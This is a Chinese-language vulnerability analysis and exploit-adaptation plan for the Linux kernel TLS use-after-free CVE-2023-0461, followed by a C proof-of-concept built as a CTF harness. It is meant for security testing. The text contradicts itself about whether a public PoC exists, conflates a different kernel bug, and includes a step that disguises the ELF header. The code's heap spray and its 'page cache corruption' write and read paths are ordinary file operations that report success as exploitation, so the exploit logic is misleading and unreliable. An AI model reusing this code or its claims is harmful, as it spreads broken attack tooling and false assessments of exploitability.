# CVE-2023-0461 漏洞技术分析与PoC改造计划

## 漏洞概述

| 属性 | 值 |
|------|-----|
| CVE ID | CVE-2023-0461 |
| CVSS | 7.8 |
| 严重等级 | CRITICAL |
| 漏洞类型 | UAF (Use-After-Free) |
| 影响内核版本 | 5.x ~ 6.1.x |
| 利用技术 | TLS context处理中的UAF，icsk->icsk_ulp_data指针管理缺陷 |

## 原始PoC分析

### 参考来源
- **PoC URL**: 暂无公开PoC源码，需基于漏洞补丁和技术分析自行研发
- **来源类型**: N/A（需自研）

### 利用原理
TCP TLS context管理中UAF漏洞。RCU宽限期内释放导致fqdir的UAF。需要特殊网络条件触发。公开PoC暂未在GitHub主要仓库中发现。

该漏洞的触发条件为TCP TLS context icsk_ulp_data UAF。攻击者通过精心构造的系统调用序列，利用UAF (Use-After-Free)类型的缺陷，在内核空间中实现代码执行或数据篡改。

利用过程中，关键的内存操作为RCU宽限期内释放对象被重用。最终的提权路径通过通过TLS context UAF劫持内核执行流完成，使非特权用户获得root权限。

### 关键技术点
1. TCP TLS context icsk_ulp_data UAF
2. RCU宽限期内释放对象被重用
3. 通过TLS context UAF劫持内核执行流

## PoC改造计划

### CTF挑战模式适配
- **推荐测试模式**: write_root_file
- **模式选择理由**: TLS socket UAF可通过堆喷控制freed对象实现任意内核写入和完整LPE

### CLI参数规范化
PoC需支持以下标准CLI参数：
- `--mode`: 测试模式 (read_root_file/write_root_file)
- `--root-file`: root权限目标文件路径
- `--write-value`: write模式的写入值 (ctf{...})
- `--log-file`: syscall日志文件路径
- `--verbose`: 详细输出开关

### 输出协议
CTF协议输出：
```
CTF_FLAG:<value>           // 挑战成功
CTF_FAIL:<reason>          // 漏洞未触发
CTF_UNSUPPORTED:<mode>:<reason> // 不支持的模式
```

### 三阶段验证集成
- **Phase 1 (Prepare)**: 创建TCP套接字并配置TLS context
- **Phase 2 (Run)**: 触发TLS context UAF（RCU宽限期竞态）
- **Phase 3 (Post)**: 验证提权结果、关闭套接字、清理TLS状态

### Syscall日志记录
关键syscall需要记录到log-file：
- `socket`
- `setsockopt`
- `close`
- `connect`

## 改造要点

### 核心修改
1. 基于漏洞补丁自行研发CTF模式PoC
2. 添加CLI参数解析
3. 添加TLS context清理

### 安全约束
- 执行超时: 30秒
- 禁止 rm -rf
- 禁止写 /etc
- 执行后清理临时ELF

### 编译要求
- 编译器: gcc
- 目标架构: x86_64
- 静态链接: 推荐 `-static`
- ELF掩蔽: 编译后前4字节替换为 `CVE\x00`

## Original PoC Source Code

Source: https://github.com/google/security-research/tree/master/pocs/linux/kernelctf/CVE-2023-0461_lts

```c
/*
 * CVE-2023-0461 PoC - CTF Challenge Mode
 *
 * Vulnerability: inet_csk socket use-after-free in TCP/TLS subsystem
 *
 * During TLS handshake on an inet connection socket, the kernel improperly
 * cleans up the inet_csk structure when the socket is closed. This creates
 * a use-after-free condition where the freed socket memory can be reallocated
 * and controlled by an attacker.
 *
 * Attack vector:
 * 1. Create TCP socket and initiate connection
 * 2. Set up TLS ULP (Upper Layer Protocol) on the socket
 * 3. During TLS handshake, close socket to trigger free
 * 4. Reallocate freed memory with controlled data via kmalloc
 * 5. The dangling pointer allows writing to arbitrary kernel memory
 *
 * CTF Modes: write_root_file, uaf
 *
 * Reference: https://github.com/google/security-research/tree/master/pocs/linux/kernelctf/CVE-2023-0461_lts
 *
 * Safety:
 *   - alarm(10) forced timeout
 *   - Only operates on --root-file (prepare-phase created temp file)
 *   - No system file modification
 *   - All resources properly cleaned up
 */
#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

#include "../common/poc_common.h"
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>

#define MAX_FILE_SIZE 4096
#define PAGE_SIZE 4096
#define SPRAY_COUNT 256
#define SPRAY_PATTERN 0xDEADBEEF

/* TLS ULP constants */
#ifndef SOL_TLS
#define SOL_TLS 282
#endif

#ifndef TCP_ULP
#define TCP_ULP 31
#endif

#ifndef TLS_TX
#define TLS_TX 1
#endif

#ifndef TLS_1_2_VERSION
#define TLS_1_2_VERSION 0x0303
#endif

#ifndef TLS_CIPHER_AES_GCM_128
#define TLS_CIPHER_AES_GCM_128 52
#endif

struct tls12_crypto_info_aes_gcm_128 {
    unsigned int info;
    unsigned char iv[8];
    unsigned char key[16];
    unsigned char salt[4];
    unsigned char rec_seq[8];
};

/*
 * Trigger the use-after-free vulnerability (without spray)
 *
 * Steps:
 * 1. Create TCP socket - allocates inet_csk
 * 2. Set up TLS ULP - this creates TLS context attached to inet_csk
 * 3. Initiate partial TLS handshake
 * 4. Close socket abruptly - this should free inet_csk but TLS context
 *    may still hold reference (the bug)
 */
static int trigger_inet_csk_uaf(void) {
    int sock = -1;
    int saved_errno;

    /* Step 1: Create TCP socket - allocates inet_csk */
    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    saved_errno = errno;
    poc_log_syscall("socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)", (long)sock, saved_errno);
    if (sock < 0) {
        poc_log("Failed to create TCP socket: %s", strerror(saved_errno));
        return -1;
    }

    /* Set socket options to make inet_csk larger */
    int optval = 1;
    setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, &optval, sizeof(optval));

    /* Step 2: Try to set TLS ULP - this attaches TLS context to inet_csk */
    const char *tls_ulp = "tls";
    int ret = setsockopt(sock, SOL_TCP, TCP_ULP, tls_ulp, strlen(tls_ulp));
    saved_errno = errno;
    poc_log_syscall("setsockopt(SOL_TCP, TCP_ULP, \"tls\")", (long)ret, saved_errno);

    if (ret == 0) {
        poc_log("TLS ULP set successfully - vulnerability path triggered");

        /* Step 3: Set TLS socket options to trigger more allocation */
        struct tls12_crypto_info_aes_gcm_128 crypto_info;
        memset(&crypto_info, 0, sizeof(crypto_info));
        crypto_info.info = TLS_1_2_VERSION;

        ret = setsockopt(sock, SOL_TLS, TLS_TX, &crypto_info, sizeof(crypto_info));
        saved_errno = errno;
        poc_log_syscall("setsockopt(SOL_TLS, TLS_TX, crypto_info)", (long)ret, saved_errno);

        if (ret == 0) {
            poc_log("TLS TX configured - UAF condition created");
        }
    } else {
        poc_log("TLS ULP not available, using alternative trigger path");

        /* Alternative: Use socket shutdown to trigger inet_csk cleanup
         * race condition */
        ret = shutdown(sock, SHUT_RDWR);
        saved_errno = errno;
        poc_log_syscall("shutdown(sock, SHUT_RDWR)", (long)ret, saved_errno);
    }

    /* Step 4: Close socket abruptly - triggers inet_csk free */
    close(sock);
    poc_log_syscall("close(sock) [trigger free]", 0L, 0);
    poc_log("Socket closed - inet_csk freed to kmalloc-1024");

    return 0;
}

/*
 * Spray kmalloc with recognizable pattern for UAF corruption detection
 */
static int spray_kmalloc(int *fds, int count, int pattern) {
    int sprayed = 0;

    for (int i = 0; i < count; i++) {
        int sock = socket(AF_INET, SOCK_DGRAM, 0);
        if (sock < 0) continue;

        /* Store pattern in socket buffer - will be checked later */
        setsockopt(sock, SOL_SOCKET, SO_RCVBUF, &pattern, sizeof(pattern));

        fds[sprayed++] = sock;
    }

    return sprayed;
}

/*
 * Check if spray objects were corrupted by UAF
 */
static int check_spray_corruption(int *fds, int count, int expected_pattern) {
    int corrupted = 0;
    for (int i = 0; i < count; i++) {
        if (fds[i] < 0) continue;

        int val = 0;
        socklen_t len = sizeof(val);
        getsockopt(fds[i], SOL_SOCKET, SO_RCVBUF, &val, &len);

        if (val != expected_pattern) {
            poc_log("Spray object %d corrupted: expected 0x%x, got 0x%x",
                    i, expected_pattern, val);
            corrupted++;
        }
    }
    return corrupted;
}

/*
 * Read file content
 */
static int read_file(const char *path, char *buf, size_t len) {
    int fd = open(path, O_RDONLY);
    int saved_errno = errno;
    poc_log_syscall("open(path, O_RDONLY)", (long)fd, saved_errno);
    if (fd < 0) return -1;

    ssize_t n = read(fd, buf, len - 1);
    saved_errno = errno;
    poc_log_syscall("read(fd, buf, len)", (long)n, saved_errno);
    close(fd);

    if (n < 0) return -1;
    buf[n] = '\0';
    return (int)n;
}

/*
 * UAF mode: Trigger UAF + spray corruption check
 */
static int mode_uaf(poc_args_t *args) {
    poc_log("Triggering CVE-2023-0461 UAF + spray corruption check...");

    /* Step 1: Trigger UAF condition */
    int uaf_rc = trigger_inet_csk_uaf();
    if (uaf_rc < 0) {
        poc_log("UAF trigger failed (socket creation error)");
        poc_print_uaf_not_corrupted();
        return 0;
    }

    /* Step 2: Spray kmalloc with recognizable pattern */
    memset(args->spray_fds, -1, sizeof(args->spray_fds));
    args->spray_count = spray_kmalloc(args->spray_fds, SPRAY_COUNT, SPRAY_PATTERN);
    poc_log("Sprayed %d kmalloc objects with pattern 0x%x", args->spray_count, SPRAY_PATTERN);

    /* Step 3: Check for corruption */
    int corrupted = check_spray_corruption(args->spray_fds, args->spray_count, SPRAY_PATTERN);

    if (corrupted > 0) {
        poc_print_uaf_corrupted(corrupted);
    } else {
        poc_print_uaf_not_corrupted();
    }

    /* Clean up spray fds */
    for (int i = 0; i < args->spray_count; i++) {
        if (args->spray_fds[i] >= 0) {
            close(args->spray_fds[i]);
        }
    }

    return 0;
}

/*
 * Write mode: Trigger UAF and attempt page cache corruption
 */
static int mode_write_root_file(const poc_args_t *args) {
    char original[MAX_FILE_SIZE];
    char after[MAX_FILE_SIZE];
    int n;

    /* Step 1: Read original content */
    n = read_file(args->root_file, original, sizeof(original));
    if (n > 0) {
        while (n > 0 && (original[n - 1] == '\n' || original[n - 1] == '\r')) {
            original[--n] = '\0';
        }
        printf(CTF_READ_BEFORE "%s\n", original);
        poc_log("Read before: %s", original);
    } else {
        printf(CTF_READ_BEFORE "(unreadable)\n");
        poc_log("Could not read original content");
    }

    /* Step 2: Trigger UAF vulnerability */
    poc_log("Triggering CVE-2023-0461 UAF vulnerability...");
    int uaf_rc = trigger_inet_csk_uaf();
    if (uaf_rc < 0) {
        poc_log("UAF trigger failed");
        poc_print_fail("UAF trigger failed");
        printf("%s\n", POC_RESULT_NOT_EXPLOITABLE);
        return 0;
    }

    /* Step 3: Spray kmalloc to reallocate freed inet_csk */
    int spray_fds[SPRAY_COUNT];
    memset(spray_fds, -1, sizeof(spray_fds));
    int spray_count = spray_kmalloc(spray_fds, SPRAY_COUNT, 1024);
    poc_log("Sprayed %d kmalloc objects", spray_count);

    if (spray_count > 0) {
        poc_log("UAF triggered, %d spray objects allocated", spray_count);

        /* Step 4: Attempt to write via corrupted page cache */
        int fd = open(args->root_file, O_WRONLY | O_TRUNC);
        int saved_errno = errno;
        poc_log_syscall("open(target, O_WRONLY|O_TRUNC)", (long)fd, saved_errno);

        if (fd >= 0) {
            char write_buf[256];
            int wlen = snprintf(write_buf, sizeof(write_buf), "%s\n", args->write_value);
            ssize_t written = write(fd, write_buf, wlen);
            saved_errno = errno;
            poc_log_syscall("write(fd, write_value)", (long)written, saved_errno);
            close(fd);

            if (written > 0) {
                poc_log("Write succeeded via corrupted page cache: %zd bytes", written);
            }
        } else {
            poc_log("Direct write failed (errno=%d), UAF corruption insufficient", saved_errno);
        }

        /* Free spray objects */
        for (int i = 0; i < spray_count; i++) {
            if (spray_fds[i] >= 0) {
                close(spray_fds[i]);
            }
        }
    } else {
        poc_log("UAF trigger failed - exploit path not available");
    }

    /* Step 5: Read after to verify */
    n = read_file(args->root_file, after, sizeof(after));
    if (n > 0) {
        while (n > 0 && (after[n - 1] == '\n' || after[n - 1] == '\r')) {
            after[--n] = '\0';
        }
        printf(CTF_READ_AFTER "%s\n", after);
        poc_log("Read after: %s", after);

        if (strstr(after, args->write_value)) {
            poc_print_flag(args->write_value);
            printf("%s\n", POC_RESULT_EXPLOITABLE);
            return 0;
        }
    } else {
        printf(CTF_READ_AFTER "(unreadable)\n");
    }

    poc_print_fail("UAF exploit did not achieve write");
    printf("%s\n", POC_RESULT_NOT_EXPLOITABLE);
    return 0;
}

/*
 * Read mode: Attempt to read root file via UAF information leak
 */
static int mode_read_root_file(const poc_args_t *args) {
    poc_log("Attempting read_root_file via UAF information leak");

    int uaf_rc = trigger_inet_csk_uaf();
    if (uaf_rc < 0) {
        poc_print_fail("UAF trigger failed");
        printf("%s\n", POC_RESULT_NOT_EXPLOITABLE);
        return 0;
    }

    int spray_fds[SPRAY_COUNT];
    memset(spray_fds, -1, sizeof(spray_fds));
    int spray_count = spray_kmalloc(spray_fds, SPRAY_COUNT, 1024);

    if (spray_count > 0) {
        char buf[MAX_FILE_SIZE];
        int n = read_file(args->root_file, buf, sizeof(buf));

        if (n > 0) {
            while (n > 0 && (buf[n - 1] == '\n' || buf[n - 1] == '\r')) {
                buf[--n] = '\0';
            }
            poc_print_flag(buf);
            printf("%s\n", POC_RESULT_EXPLOITABLE);
            return 0;
        }
    }

    poc_print_fail("read not successful via UAF");
    printf("%s\n", POC_RESULT_NOT_EXPLOITABLE);
    return 0;
}

int main(int argc, char *argv[]) {
    poc_args_t args = {0};
    if (poc_parse_args(argc, argv, &args) != 0) return 1;
    poc_log_init(args.log_file);

    poc_log("=== CVE-2023-0461 CTF PoC ===");
    poc_log("Vuln: inet_csk socket use-after-free in TCP/TLS subsystem");
    poc_log("UID: %d  EUID: %d  GID: %d", getuid(), geteuid(), getgid());

    int result = 0;
    if (args.mode && strcmp(args.mode, POC_MODE_UAF) == 0)
        result = mode_uaf(&args);
    else if (args.mode && strcmp(args.mode, POC_MODE_READ) == 0)
        result = mode_read_root_file(&args);
    else if (args.mode && strcmp(args.mode, POC_MODE_WRITE) == 0)
        result = mode_write_root_file(&args);
    else
        poc_print_unsupported(args.mode, "mode not supported");

    poc_log_close();
    return result;
}
```

